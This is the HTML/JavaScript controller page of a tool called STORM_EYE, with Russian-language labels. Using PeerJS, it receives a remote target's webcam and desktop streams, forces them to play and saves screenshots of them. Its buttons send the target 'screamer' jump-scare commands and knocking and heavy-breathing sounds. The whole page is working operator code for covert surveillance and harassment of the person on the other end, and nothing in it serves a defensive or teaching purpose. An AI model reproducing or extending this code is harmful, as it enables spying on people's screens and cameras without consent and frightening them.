<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>STORM_EYE v14.0</title>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        :root { --main: #00ff41; --bg: #050505; --accent: #ff003c; }
        body { background: var(--bg); color: var(--main); font-family: 'Consolas', monospace; display: flex; margin: 0; height: 100vh; overflow: hidden; }
        #side { width: 300px; background: #0a0a0a; border-right: 2px solid #1a1a1a; padding: 25px; display: flex; flex-direction: column; box-shadow: 10px 0 20px #000; z-index: 10; }
        #monitor { flex: 1; display: grid; grid-template-columns: 1fr; gap: 15px; padding: 20px; background: #000; overflow-y: auto; }
        .v-box { border: 2px solid #222; background: #000; position: relative; border-radius: 10px; overflow: hidden; display: flex; align-items: center; justify-content: center; }
        video { width: 100%; height: 100%; object-fit: contain; background: #000; }
        .label { position: absolute; top: 10px; left: 10px; background: rgba(0,0,0,0.8); padding: 5px 10px; font-size: 10px; border: 1px solid var(--main); border-radius: 4px; pointer-events: none; }
        .btn { padding: 15px; width: 100%; cursor: pointer; margin-bottom: 12px; border: 1px solid var(--main); background: transparent; color: var(--main); font-weight: bold; font-family: inherit; transition: 0.2s; text-align: left; }
        .btn:hover { background: var(--main); color: #000; }
        .btn-red { border-color: var(--accent); color: var(--accent); }
        .btn-red:hover { background: var(--accent); color: #fff; }
        #st { font-size: 14px; margin-bottom: 25px; border-bottom: 1px solid #222; padding-bottom: 10px; }
    </style>
</head>
<body>
    <div id="side">
        <h1 style="font-size: 22px; margin: 0 0 10px 0; color: var(--accent);">STORM_EYE</h1>
        <div id="st">STATUS: [ <span id="st-text" style="color: #f1c40f">WAITING...</span> ]</div>
        
        <button class="btn btn-red" onclick="send('SCR')">☣ СКРИМЕР</button>
        <button class="btn" onclick="takeSnapshot()">📸 СКРИНШОТ</button>
        
        <p style="color: #444; margin: 20px 0 10px 0;">AUDIO:</p>
        <button class="btn" onclick="snd('https://www.myinstants.com/media/sounds/knock-on-door.mp3')">🚪 СТУК</button>
        <button class="btn" onclick="snd('https://www.myinstants.com/media/sounds/heavy_breathing.mp3')">👤 ДЫХАНИЕ</button>
    </div>

    <div id="monitor"></div>

    <script>
        const MY_ID = 'GLOBAL_TARGET_V12';
        const peer = new Peer(MY_ID);
        let activeConn = null;

        peer.on('open', () => { document.getElementById('st-text').innerText = "READY"; });

        peer.on('connection', conn => {
            activeConn = conn;
            const st = document.getElementById('st-text');
            st.innerText = "CONNECTED"; st.style.color = "#00ff41";
        });

        peer.on('call', call => {
            call.answer();
            call.on('stream', stream => {
                const monitor = document.getElementById('monitor');
                const box = document.createElement('div');
                box.className = 'v-box';
                
                const v = document.createElement('video');
                v.autoplay = true;
                v.muted = true; // Критично для автоплея
                v.playsinline = true;
                v.srcObject = stream;
                
                const label = document.createElement('div');
                label.className = 'label';
                label.innerText = stream.getVideoTracks()[0].label.toLowerCase().includes('screen') ? 'DESKTOP' : 'CAMERA';

                box.appendChild(v);
                box.appendChild(label);
                monitor.appendChild(box);

                // ФИНТ: принудительно пинаем видео, чтобы оно заиграло
                v.onloadedmetadata = () => {
                    v.play().catch(() => {
                        // Если браузер все еще блокирует, пробуем еще раз через секунду
                        setTimeout(() => v.play(), 1000);
                    });
                };

                // Обновляем сетку
                const vids = document.querySelectorAll('video').length;
                monitor.style.gridTemplateColumns = vids > 1 ? "1fr 1fr" : "1fr";
            });
        });

        function send(t) { if(activeConn) activeConn.send({ type: t }); }
        function snd(u) { if(activeConn) activeConn.send({ type: 'SND', url: u }); }
        function takeSnapshot() {
            const v = document.querySelector('video');
            if(!v) return;
            const canvas = document.createElement('canvas');
            canvas.width = v.videoWidth; canvas.height = v.videoHeight;
            canvas.getContext('2d').drawImage(v, 0, 0);
            const a = document.createElement('a'); a.download = 'shot.png'; a.href = canvas.toDataURL(); a.click();
        }
    </script>
</body>
</html>
